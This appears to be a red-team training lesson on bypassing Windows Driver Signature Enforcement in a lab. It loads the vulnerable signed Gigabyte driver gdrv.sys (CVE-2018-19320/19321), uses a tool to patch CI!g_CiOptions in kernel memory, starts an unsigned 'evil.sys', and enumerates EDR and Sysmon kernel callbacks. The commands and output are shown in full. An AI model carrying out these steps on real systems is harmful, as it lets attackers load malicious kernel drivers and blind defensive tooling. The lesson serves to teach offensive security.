Loading your own driver can be tricky due to Driver Signature Enforcement (DSE) - a protection that blocks a kernel driver from loading if it's not signed by a trusted authority.  The "legitimate" way to do this is to enable [Test Signing](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option) but there are some significant downsides.

1.  A "Test Mode" watermark is displayed on the desktop.
2.  A reboot is required for changes to take effect.

  

This is the case on the Attacker Windows VM but not on WKSTN-1.

We can see that `evil.sys` does not have a valid signature (it's test signed with the Windows Driver Kit).  We can create a service but not start it.

```powershell
PS C:\> hostname; whoami
wkstn-1
rto2\cbridges

PS C:\> Get-AuthenticodeSignature -FilePath C:\evil.sys

SignerCertificate                         Status                                 Path
-----------------                         ------                                 ----
511197FFE44D79226828B9404B1878110D317515  UnknownError                           evil.sys

PS C:\> sc.exe create evilDriver type= kernel binPath= C:\evil.sys
[SC] CreateService SUCCESS

PS C:\> sc.exe start evilDriver
[SC] StartService FAILED 577:

Windows cannot verify the digital signature for this file. A recent hardware or software change might have installed a file that is signed incorrectly or damaged, or that might be malicious software from an unknown source.
```  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/kernel/evil-sig.png)

  

On the other hand - `gdrv.sys` is a legitimate driver signed by Gigabyte in 2017 which we can load.

```powershell
PS C:\> Get-AuthenticodeSignature -FilePath C:\gdrv.sys

SignerCertificate                         Status                                 Path
-----------------                         ------                                 ----
E31B1CE555B78944D20F160DF3BE831F1C638AE3  Valid                                  gdrv.sys

PS C:\> sc.exe create gigabyte type= kernel binPath= C:\gdrv.sys
[SC] CreateService SUCCESS

PS C:\> sc.exe start gigabyte

SERVICE_NAME: gigabyte
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :
```  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/kernel/gdrv-sig.png)

This driver has two vulnerabilities (CVE-2018-19320 & CVE-2018-19321) which provide arbitrary memory read/write from userland.  During runtime, the driver enforcement policy is located in memory at **CI!g_CiOptions** (where CI is the "Code Integrity Module" DLL, `C:\Windows\System32\ci.dll`).

When a service start request is submitted, this policy value is checked and the driver will be allowed to start (or not).  With an arbitrary write primitive in kernel memory, we can "simply" overwrite the policy value.  This is nicely wrapped up in `gClie.exe`.  Use `-l` to show the relevant addresses.

There's no export for `g_CiOptions`, so the address is calculated based on an offset from `CiInitialize`.

```powershell
PS C:\> .\gCli.exe -l
FFFFF80772D20000 (CI.dll)
FFFFF80772D5D140 (Ci!CiInitialize)
FFFFF80772D5C004 (CI!g_CiOptions)
``` 

Use `-d` to disable driver signing, start the evil driver, and then re-enable driver signing with `-e`.

```powershell
PS C:\> .\gCli.exe -d
[+] Driver Signing has been DISABLED!

PS C:\> sc.exe start evilDriver

SERVICE_NAME: evilDriver
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :

PS C:\> .\gCli.exe -e
[+] Driver Signing has been ENABLED!

PS C:\> .\evilCli.exe -l
[*] Process Callbacks
[00] 0xfffff80772e16540 (cng.sys + 0x6540)
[01] 0xfffff807735b8650 (xen.sys + 0x8650)
[02] 0xfffff80773a95d60 (WdFilter.sys + 0x45d60)
[03] 0xfffff80772c5b4b0 (ksecdd.sys + 0x1b4b0)
[04] 0xfffff80773e7b550 (tcpip.sys + 0x4b550)
[05] 0xfffff807742b88e0 (SysmonDrv.sys + 0x88e0)
[06] 0xfffff80772d97820 (CI.dll + 0x77820)
[07] 0xfffff8077473d1c0 (dxgkrnl.sys + 0xd1c0)
[08] 0xfffff807758eacf0 (peauth.sys + 0x3acf0)
[*] Thread Callbacks
[00] 0xfffff80773a974a0 (WdFilter.sys + 0x474a0)
[01] 0xfffff80773a97200 (WdFilter.sys + 0x47200)
[02] 0xfffff807742b80d0 (SysmonDrv.sys + 0x80d0)
[03] 0xfffff80775c81010 (mmcss.sys + 0x1010)
[*] LoadImage Callbacks
[00] 0xfffff807735b8120 (xen.sys + 0x8120)
[01] 0xfffff807735f3240 (EC2WinUtilDriver.sys + 0x3240)
[02] 0xfffff80773a96710 (WdFilter.sys + 0x46710)
[03] 0xfffff807742bdc10 (SysmonDrv.sys + 0xdc10)
[04] 0xfffff80774e1e940 (ahcache.sys + 0x1e940)
```

	The kernel will bug check the in-memory value against the boot policy.  If it sees a difference, the machine will BSOD.  If you patch the policy value, restore it ASAP.

You can dive deeper into drivers by taking our [Offensive Driver Development](https://training.zeropointsecurity.co.uk/courses/offensive-driver-development) course.